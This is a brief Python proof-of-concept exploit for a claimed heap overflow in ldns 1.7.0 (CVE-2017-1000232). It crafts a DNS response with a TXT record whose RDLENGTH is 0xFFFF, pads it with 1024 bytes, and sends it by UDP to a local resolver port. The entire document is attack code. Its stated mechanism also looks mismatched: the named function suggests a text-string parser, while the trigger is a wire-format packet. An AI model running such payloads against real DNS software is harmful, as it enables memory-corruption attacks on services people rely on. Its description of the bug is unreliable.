#!/usr/bin/env python3
"""
PoC: CVE-2017-1000232 - ldns 1.7.0 heap overflow in ldns_str2rdf_long_str
Trigger: DNS packet with TXT record having oversized RDATA length field
"""

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# DNS response with TXT record: RDLENGTH claims 65535 bytes
hdr = struct.pack(">HHHHHH", 0x1234, 0x8400, 1, 1, 0, 0)
qry = b"\x04test\x00\x00\x01\x00\x01"
# TXT answer with huge RDLENGTH (0xFFFF) triggers heap overflow in ldns
ans = b"\xc0\x0c\x00\x10\x00\x01\x00\x00\x00\x3c\xff\xff" + b"A" * 1024
s.sendto(hdr + qry + ans, ("localhost", 5053))
s.close()
